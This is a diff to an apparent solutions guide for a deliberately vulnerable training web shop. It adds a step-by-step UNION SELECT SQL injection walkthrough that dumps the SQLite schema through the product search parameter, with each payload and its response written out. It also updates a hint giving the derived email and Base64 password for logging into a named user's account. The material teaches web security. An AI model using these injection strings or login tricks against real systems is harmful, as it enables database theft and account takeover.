@@ -122,6 +122,62 @@ error situation and solve this challenge immediately:
 
    ![XSS alert box](img/xss1_alert.png)
 
+### Exfiltrate the entire DB schema definition via SQL Injection
+
+1. From any errors seen during previous SQL Injection attempts you
+   should know that SQLite is the relational database in use.
+2. Check <https://www.sqlite.org/faq.html> to learn in "(7) How do I
+   list all tables/indices contained in an SQLite database" that the
+   schema is stored in a system table `sqlite_master`.
+3. You will also learn that this table contains a column `sql` which
+   holds the text of the original `CREATE TABLE` or `CREATE INDEX`
+   statement that created the table or index. Getting your hands on this
+   would allow you to replicate the entire DB schema.
+4. During the
+   [Order the Christmas special offer of 2014](#order-the-christmas-special-offer-of-2014)
+   challenge you learned that the `/rest/products/search` endpoint is
+   susceptible to SQL Injection into the `q` parameter.
+5. The attack payload you need to craft is a `UNION SELECT` merging the
+   data from the `sqlite_master` table into the products returned in the
+   JSON result.
+6. As a starting point we use the known working `'))--` attack pattern
+   and try to make a `UNION SELECT` out of it
+7. Searching for `')) UNION SELECT * FROM x--` fails with a
+   `SQLITE_ERROR: no such table: x` as you would expect.
+8. Searching for `')) UNION SELECT * FROM sqlite_master--` fails with a
+   promising `SQLITE_ERROR: SELECTs to the left and right of UNION do
+   not have the same number of result columns` which least confirms the
+   table name.
+9. The next step in a `UNION SELECT`-attack is typically to find the
+   right number of returned columns. As the _Search Results_ table in
+   the UI has 3 columns displaying data, it will probably at least be
+   three. You keep adding columns until no more `SQLITE_ERROR` occurs
+   (or at least it becomes a different one):
+
+   1. `')) UNION SELECT '1' FROM sqlite_master--` fails with `number of
+      result columns` error
+   2. `')) UNION SELECT '1', '2' FROM sqlite_master--` fails with
+      `number of result columns` error
+   3. `')) UNION SELECT '1', '2', '3' FROM sqlite_master--` fails with
+      `number of result columns` error
+   4. (...)
+   5. `')) UNION SELECT '1', '2', '3', '4', '5', '6', '7' FROM
+      sqlite_master--` _still fails_ with `number of result columns`
+      error
+   6. `')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8' FROM
+      sqlite_master--` finally gives you a JSON response back with an
+      extra element
+      `{"id":"1","name":"2","description":"3","price":"4","image":"5","createdAt":"6","updatedAt":"7","deletedAt":"8"}`.
+
+10. Next you get rid of the unwanted product results changing the query
+    into something like `qwert')) UNION SELECT '1', '2', '3', '4', '5',
+    '6', '7', '8' FROM sqlite_master--` leaving only the "`UNION`ed"
+    element in the result set
+11. The last step is to replace one of the fixed values with correct
+    column name `sql`, which is why searching for `qwert')) UNION SELECT
+    sql, '2', '3', '4', '5', '6', '7', '8' FROM sqlite_master--` solves
+    the challenge.
+
 ### Give a devastating zero-star feedback to the store
 
 Place an order that makes you rich. Visit the _Contact Us_ form and put
@@ -992,10 +1048,9 @@ more attention & a good portion of shrewdness.
    function to encode strings into Base64.
 7. What is passed into `btoa()` is `email.split("").reverse().join("")`,
    which is simply the email address string reversed.
-8. Now all you have to do is Base64-encode
-   `moc.liamelgoog@hcinimmik.nreojb`, so you can log in directly with
-   _Email_ `bjoern.kimminich@googlemail.com` and _Password_
-   `bW9jLmxpYW1lbGdvb2dAaGNpbmltbWlrLm5yZW9qYg==`.
+8. Now all you have to do is Base64-encode `moc.liamg@hcinimmik.nreojb`,
+   so you can log in directly with _Email_ `bjoern.kimminich@gmail.com`
+   and _Password_ `bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=`.
 
 ### Steal someone else's personal data without using Injection
 
